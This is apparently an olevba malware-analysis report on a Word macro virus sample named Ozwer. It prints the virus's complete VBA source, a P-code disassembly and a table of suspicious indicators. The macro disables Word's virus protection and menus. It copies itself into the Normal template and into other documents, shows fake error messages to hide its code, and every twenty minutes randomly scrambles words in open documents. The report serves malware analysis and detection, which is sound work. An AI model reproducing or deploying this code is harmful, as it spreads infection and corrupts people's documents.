olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ozwer.m
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ozwer.m - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ozwer.bas 
in file: Virus.MSWord.Ozwer.m - OLE stream: 'Macros/VBA/ozwer'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit
Public Sub AutoExec()
On Error Resume Next
    With CommandBars("tools")
.Controls(13).Enabled = False 'macro
.Controls(14).Enabled = False 'plantillas y complementos....
.Controls(15).Enabled = False  'personalizar...
.Controls(16).Enabled = True  'opciones...
End With
CommandBars("view").Controls(6).Enabled = False 'barras de herramientas
Application.ScreenUpdating = False
Application.DisplayAlerts = wdAlertsNone
Options.VirusProtection = False
End Sub
Sub autoOpen()
On Error Resume Next
AutoExec
    Application.ScreenUpdating = False
    Application.DisplayAlerts = wdAlertsNone
    Options.VirusProtection = True
inf
timer
End Sub
Sub AutoClose()
c
End Sub
Sub inf()
On Error Resume Next
Options.SaveNormalPrompt = False
    If Nch = False Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="ozwer", Object:=wdOrganizerObjectProjectItems
        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="oswf", Object:=wdOrganizerObjectProjectItems
        Application.Caption = "° Microsoft Word"
    End If
    If Dch = False Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="ozwer", Object:=wdOrganizerObjectProjectItems
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="oswf", Object:=wdOrganizerObjectProjectItems
    End If
End Sub
Function Nch()
Dim i As Integer
    For i = 1 To NormalTemplate.VBProject.vbcomponents.Count
        If NormalTemplate.VBProject.vbcomponents(i).Name = "ozwer" Then Nch = True
    Next
End Function
Function Dch()
Dim j As Integer
    For j = 1 To ActiveDocument.VBProject.vbcomponents.Count
        If ActiveDocument.VBProject.vbcomponents(j).Name = "ozwer" Then Dch = True
    Next
End Function
Public Sub c()
Options.SaveNormalPrompt = False
inf
End Sub
Sub FormatFont()
inf
Dialogs(wdDialogFormatFont).Show
End Sub
Sub FilePrint()
inf
Dialogs(wdDialogFilePrint).Show
End Sub
Sub FileSaveas()
c


Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub FileSave()
c
ActiveDocument.Save
End Sub
Sub FileClose()
c
ActiveDocument.Close
End Sub
Sub filenew()
Word.Documents.Add
inf
timer
End Sub
Sub EditCopy()
inf
Selection.Copy
End Sub
Sub editpaste()
inf

Selection.Paste
End Sub
Sub ToolsMacro()
On Error Resume Next
oswf.Show
End Sub
Sub FileExit()
c
Application.Quit
MsgBox ("oK")
End Sub
Sub ViewVBCode()
On Error Resume Next
Dim letr As String
letr = CommandBars("tools").Controls(16).Caption
Select Case letr
Case "Opcio&nes..."
MsgBox "Error interno en Word Basic Err=1100e." + vbCr + "Imposible cargar bibliotecas dinámicas." + vbCr + vbCr + "Compruebe que todos los archivos estén" + vbCr + "en sus carpetas." + vbCr + vbCr + "Si el problema persiste, consulte la guia" + vbCr + "del usuario.", vbCritical
Case "&Options..."
MsgBox "Word Basic internal error Err=1100e." + vbCr + "Unable to load module 1x6004." + vbCr + vbCr + "Check that all files are in their folders" + vbCr + "and that they are not damaged." + vbCr + vbCr + "If the problem persists, consult user´s guide.", vbCritical
End Select
End Sub
Sub ToolsOptions()
Dim Y As Byte
Randomize
Y = Int((7 * Rnd) + 1)
Select Case Y
    Case 1
        Dialogs(wdDialogToolsOptionsTabView).Show
    Case 2
        Dialogs(wdDialogToolsOptionsSpellingAndGrammar).Show
    Case 3
        Dialogs(wdDialogToolsOptionsTabPrint).Show
    Case 4
        Dialogs(wdDialogToolsOptionsTabEdit).Show
    Case 6
         Dialogs(wdDialogToolsOptionsTabTrackChanges).Show
    Case 5
         Dialogs(wdDialogToolsOptionsTabUserInfo).Show
    Case 7
         Dialogs(wdDialogToolsOptionsCompatibility).Show
    End Select
End Sub
Sub osw2()Rem muy muy buena pero sin forma de desarmarlo !!!!!
Dim indi, nu, nu2, limite, x As Integer
x = Int((4 * Rnd) + 1)
On Error GoTo bye
limite = ActiveDocument.Words.Count
If limite = (limite > 350 And limite < 400) Or (limite > 700 And limite < 750) Or (limite > 900 And limite < 950) Or (limite > 1000 And limite < 1050) Or (limite > 1150 And limite < 1200) Or (limite > 1300 And limite < 1350) Or (limite > 1500 And limite < 1600) And x = 3 Then
    Selection.HomeKey Unit:=wdStory
    For indi = 1 To limite
        Randomize
        nu2 = Int((5 * Rnd) + 2)
        nu = Int((4 * Rnd) + 1)
        indi = indi + nu2
            ActiveDocument.Words(indi).Select
        WordBasic.MoveText
            If nu = 1 Then
                        Selection.MoveRight Unit:=wdWord, Count:=nu2
            Else
                        Selection.MoveLeft Unit:=wdWord, Count:=nu2
            End If
        WordBasic.OK
Next indi
End If
timer
bye:
End Sub
Sub timer()
Application.OnTime When:=Now + TimeValue("00:20:00"), Name:="osw2"
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Ozwer.m
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/ozwer - 9560 bytes
' Line #0:
' 	Option  (Explicit)
' Line #1:
' 	FuncDefn (Public Sub AutoExec())
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	StartWithExpr 
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	With 
' Line #4:
' 	LitVarSpecial (False)
' 	LitDI2 0x000D 
' 	ArgsMemLdWith Controls 0x0001 
' 	MemSt Enabled 
' 	QuoteRem 0x001E 0x0005 "macro"
' Line #5:
' 	LitVarSpecial (False)
' 	LitDI2 0x000E 
' 	ArgsMemLdWith Controls 0x0001 
' 	MemSt Enabled 
' 	QuoteRem 0x001E 0x001D "plantillas y complementos...."
' Line #6:
' 	LitVarSpecial (False)
' 	LitDI2 0x000F 
' 	ArgsMemLdWith Controls 0x0001 
' 	MemSt Enabled 
' 	QuoteRem 0x001F 0x000F "personalizar..."
' Line #7:
' 	LitVarSpecial (True)
' 	LitDI2 0x0010 
' 	ArgsMemLdWith Controls 0x0001 
' 	MemSt Enabled 
' 	QuoteRem 0x001E 0x000B "opciones..."
' Line #8:
' 	EndWith 
' Line #9:
' 	LitVarSpecial (False)
' 	LitDI2 0x0006 
' 	LitStr 0x0004 "view"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' 	QuoteRem 0x0030 0x0016 "barras de herramientas"
' Line #10:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #11:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #12:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #13:
' 	EndSub 
' Line #14:
' 	FuncDefn (Sub autoOpen())
' Line #15:
' 	OnError (Resume Next) 
' Line #16:
' 	ArgsCall AutoExec 0x0000 
' Line #17:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #18:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #19:
' 	LitVarSpecial (True)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #20:
' 	ArgsCall inf 0x0000 
' Line #21:
' 	ArgsCall timer 0x0000 
' Line #22:
' 	EndSub 
' Line #23:
' 	FuncDefn (Sub AutoClose())
' Line #24:
' 	ArgsCall c 0x0000 
' Line #25:
' 	EndSub 
' Line #26:
' 	FuncDefn (Sub inf())
' Line #27:
' 	OnError (Resume Next) 
' Line #28:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #29:
' 	Ld Nch 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #30:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0005 "ozwer"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #31:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0004 "oswf"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #32:
' 	LitStr 0x0010 "° Microsoft Word"
' 	Ld Application 
' 	MemSt Caption 
' Line #33:
' 	EndIfBlock 
' Line #34:
' 	Ld Dch 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #35:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0005 "ozwer"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #36:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0004 "oswf"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #37:
' 	EndIfBlock 
' Line #38:
' 	EndSub 
' Line #39:
' 	FuncDefn (Function Nch())
' Line #40:
' 	Dim 
' 	VarDefn i (As Integer)
' Line #41:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd vbcomponents 
' 	MemLd Count 
' 	For 
' Line #42:
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd vbcomponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0005 "ozwer"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St Nch 
' 	EndIf 
' Line #43:
' 	StartForVariable 
' 	Next 
' Line #44:
' 	EndFunc 
' Line #45:
' 	FuncDefn (Function Dch())
' Line #46:
' 	Dim 
' 	VarDefn j (As Integer)
' Line #47:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd vbcomponents 
' 	MemLd Count 
' 	For 
' Line #48:
' 	Ld j 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd vbcomponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0005 "ozwer"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St Dch 
' 	EndIf 
' Line #49:
' 	StartForVariable 
' 	Next 
' Line #50:
' 	EndFunc 
' Line #51:
' 	FuncDefn (Public Sub c())
' Line #52:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #53:
' 	ArgsCall inf 0x0000 
' Line #54:
' 	EndSub 
' Line #55:
' 	FuncDefn (Sub FormatFont())
' Line #56:
' 	ArgsCall inf 0x0000 
' Line #57:
' 	Ld wdDialogFormatFont 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #58:
' 	EndSub 
' Line #59:
' 	FuncDefn (Sub FilePrint())
' Line #60:
' 	ArgsCall inf 0x0000 
' Line #61:
' 	Ld wdDialogFilePrint 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #62:
' 	EndSub 
' Line #63:
' 	FuncDefn (Sub FileSaveas())
' Line #64:
' 	ArgsCall c 0x0000 
' Line #65:
' Line #66:
' Line #67:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #68:
' 	EndSub 
' Line #69:
' 	FuncDefn (Sub FileSave())
' Line #70:
' 	ArgsCall c 0x0000 
' Line #71:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #72:
' 	EndSub 
' Line #73:
' 	FuncDefn (Sub FileClose())
' Line #74:
' 	ArgsCall c 0x0000 
' Line #75:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #76:
' 	EndSub 
' Line #77:
' 	FuncDefn (Sub filenew())
' Line #78:
' 	Ld Word 
' 	MemLd Documents 
' 	ArgsMemCall Add 0x0000 
' Line #79:
' 	ArgsCall inf 0x0000 
' Line #80:
' 	ArgsCall timer 0x0000 
' Line #81:
' 	EndSub 
' Line #82:
' 	FuncDefn (Sub EditCopy())
' Line #83:
' 	ArgsCall inf 0x0000 
' Line #84:
' 	Ld Selection 
' 	ArgsMemCall Copy 0x0000 
' Line #85:
' 	EndSub 
' Line #86:
' 	FuncDefn (Sub editpaste())
' Line #87:
' 	ArgsCall inf 0x0000 
' Line #88:
' Line #89:
' 	Ld Selection 
' 	ArgsMemCall Paste 0x0000 
' Line #90:
' 	EndSub 
' Line #91:
' 	FuncDefn (Sub ToolsMacro())
' Line #92:
' 	OnError (Resume Next) 
' Line #93:
' 	Ld oswf 
' 	ArgsMemCall Show 0x0000 
' Line #94:
' 	EndSub 
' Line #95:
' 	FuncDefn (Sub FileExit())
' Line #96:
' 	ArgsCall c 0x0000 
' Line #97:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #98:
' 	LitStr 0x0002 "oK"
' 	Paren 
' 	ArgsCall MsgBox 0x0001 
' Line #99:
' 	EndSub 
' Line #100:
' 	FuncDefn (Sub ViewVBCode())
' Line #101:
' 	OnError (Resume Next) 
' Line #102:
' 	Dim 
' 	VarDefn letr (As String)
' Line #103:
' 	LitDI2 0x0010 
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemLd Caption 
' 	St letr 
' Line #104:
' 	Ld letr 
' 	SelectCase 
' Line #105:
' 	LitStr 0x000C "Opcio&nes..."
' 	Case 
' 	CaseDone 
' Line #106:
' 	LitStr 0x0026 "Error interno en Word Basic Err=1100e."
' 	Ld vbCr 
' 	Add 
' 	LitStr 0x0027 "Imposible cargar bibliotecas dinámicas."
' 	Add 
' 	Ld vbCr 
' 	Add 
' 	Ld vbCr 
' 	Add 
' 	LitStr 0x0026 "Compruebe que todos los archivos estén"
' 	Add 
' 	Ld vbCr 
' 	Add 
' 	LitStr 0x0010 "en sus carpetas."
' 	Add 
' 	Ld vbCr 
' 	Add 
' 	Ld vbCr 
' 	Add 
' 	LitStr 0x0029 "Si el problema persiste, consulte la guia"
' 	Add 
' 	Ld vbCr 
' 	Add 
' 	LitStr 0x000C "del usuario."
' 	Add 
' 	Ld vbCritical 
' 	ArgsCall MsgBox 0x0002 
' Line #107:
' 	LitStr 0x000B "&Options..."
' 	Case 
' 	CaseDone 
' Line #108:
' 	LitStr 0x0024 "Word Basic internal error Err=1100e."
' 	Ld vbCr 
' 	Add 
' 	LitStr 0x001D "Unable to load module 1x6004."
' 	Add 
' 	Ld vbCr 
' 	Add 
' 	Ld vbCr 
' 	Add 
' 	LitStr 0x0029 "Check that all files are in their folders"
' 	Add 
' 	Ld vbCr 
' 	Add 
' 	LitStr 0x001E "and that they are not damaged."
' 	Add 
' 	Ld vbCr 
' 	Add 
' 	Ld vbCr 
' 	Add 
' 	LitStr 0x002E "If the problem persists, consult user´s guide."
' 	Add 
' 	Ld vbCritical 
' 	ArgsCall MsgBox 0x0002 
' Line #109:
' 	EndSelect 
' Line #110:
' 	EndSub 
' Line #111:
' 	FuncDefn (Sub ToolsOptions())
' Line #112:
' 	Dim 
' 	VarDefn Y (As Byte)
' Line #113:
' 	ArgsCall Read 0x0000 
' Line #114:
' 	LitDI2 0x0007 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St Y 
' Line #115:
' 	Ld Y 
' 	SelectCase 
' Line #116:
' 	LitDI2 0x0001 
' 	Case 
' 	CaseDone 
' Line #117:
' 	Ld wdDialogToolsOptionsTabView 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #118:
' 	LitDI2 0x0002 
' 	Case 
' 	CaseDone 
' Line #119:
' 	Ld wdDialogToolsOptionsSpellingAndGrammar 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #120:
' 	LitDI2 0x0003 
' 	Case 
' 	CaseDone 
' Line #121:
' 	Ld wdDialogToolsOptionsTabPrint 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #122:
' 	LitDI2 0x0004 
' 	Case 
' 	CaseDone 
' Line #123:
' 	Ld wdDialogToolsOptionsTabEdit 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #124:
' 	LitDI2 0x0006 
' 	Case 
' 	CaseDone 
' Line #125:
' 	Ld wdDialogToolsOptionsTabTrackChanges 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #126:
' 	LitDI2 0x0005 
' 	Case 
' 	CaseDone 
' Line #127:
' 	Ld wdDialogToolsOptionsTabUserInfo 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #128:
' 	LitDI2 0x0007 
' 	Case 
' 	CaseDone 
' Line #129:
' 	Ld wdDialogToolsOptionsCompatibility 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #130:
' 	EndSelect 
' Line #131:
' 	EndSub 
' Line #132:
' 	FuncDefn (Sub osw2())
' 	Rem 0x0031 " muy muy buena pero sin forma de desarmarlo !!!!!"
' Line #133:
' 	Dim 
' 	VarDefn indi
' 	VarDefn nu
' 	VarDefn nu2
' 	VarDefn limite
' 	VarDefn x (As Integer)
' Line #134:
' 	LitDI2 0x0004 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St x 
' Line #135:
' 	OnError bye 
' Line #136:
' 	Ld ActiveDocument 
' 	MemLd Words 
' 	MemLd Count 
' 	St limite 
' Line #137:
' 	Ld limite 
' 	Ld limite 
' 	LitDI2 0x015E 
' 	Gt 
' 	Ld limite 
' 	LitDI2 0x0190 
' 	Lt 
' 	And 
' 	Paren 
' 	Eq 
' 	Ld limite 
' 	LitDI2 0x02BC 
' 	Gt 
' 	Ld limite 
' 	LitDI2 0x02EE 
' 	Lt 
' 	And 
' 	Paren 
' 	Or 
' 	Ld limite 
' 	LitDI2 0x0384 
' 	Gt 
' 	Ld limite 
' 	LitDI2 0x03B6 
' 	Lt 
' 	And 
' 	Paren 
' 	Or 
' 	Ld limite 
' 	LitDI2 0x03E8 
' 	Gt 
' 	Ld limite 
' 	LitDI2 0x041A 
' 	Lt 
' 	And 
' 	Paren 
' 	Or 
' 	Ld limite 
' 	LitDI2 0x047E 
' 	Gt 
' 	Ld limite 
' 	LitDI2 0x04B0 
' 	Lt 
' 	And 
' 	Paren 
' 	Or 
' 	Ld limite 
' 	LitDI2 0x0514 
' 	Gt 
' 	Ld limite 
' 	LitDI2 0x0546 
' 	Lt 
' 	And 
' 	Paren 
' 	Or 
' 	Ld limite 
' 	LitDI2 0x05DC 
' 	Gt 
' 	Ld limite 
' 	LitDI2 0x0640 
' 	Lt 
' 	And 
' 	Paren 
' 	Ld x 
' 	LitDI2 0x0003 
' 	Eq 
' 	And 
' 	Or 
' 	IfBlock 
' Line #138:
' 	Ld wdStory 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall HomeKey 0x0001 
' Line #139:
' 	StartForVariable 
' 	Ld indi 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld limite 
' 	For 
' Line #140:
' 	ArgsCall Read 0x0000 
' Line #141:
' 	LitDI2 0x0005 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0002 
' 	Add 
' 	FnInt 
' 	St nu2 
' Line #142:
' 	LitDI2 0x0004 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St nu 
' Line #143:
' 	Ld indi 
' 	Ld nu2 
' 	Add 
' 	St indi 
' Line #144:
' 	Ld indi 
' 	Ld ActiveDocument 
' 	ArgsMemLd Words 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #145:
' 	Ld WordBasic 
' 	ArgsMemCall MoveText 0x0000 
' Line #146:
' 	Ld nu 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #147:
' 	Ld wdWord 
' 	ParamNamed Unit 
' 	Ld nu2 
' 	ParamNamed Count 
' 	Ld Selection 
' 	ArgsMemCall MoveRight 0x0002 
' Line #148:
' 	ElseBlock 
' Line #149:
' 	Ld wdWord 
' 	ParamNamed Unit 
' 	Ld nu2 
' 	ParamNamed Count 
' 	Ld Selection 
' 	ArgsMemCall MoveLeft 0x0002 
' Line #150:
' 	EndIfBlock 
' Line #151:
' 	Ld WordBasic 
' 	ArgsMemCall OK 0x0000 
' Line #152:
' 	StartForVariable 
' 	Ld indi 
' 	EndForVariable 
' 	NextVar 
' Line #153:
' 	EndIfBlock 
' Line #154:
' 	ArgsCall timer 0x0000 
' Line #155:
' 	Label bye 
' Line #156:
' 	EndSub 
' Line #157:
' 	FuncDefn (Sub timer())
' Line #158:
' 	Ld Now 
' 	LitStr 0x0008 "00:20:00"
' 	ArgsLd TimeValue 0x0001 
' 	Add 
' 	ParamNamed When 
' 	LitStr 0x0004 "osw2"
' 	ParamNamed New 
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' Line #159:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |autoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|vbcomponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

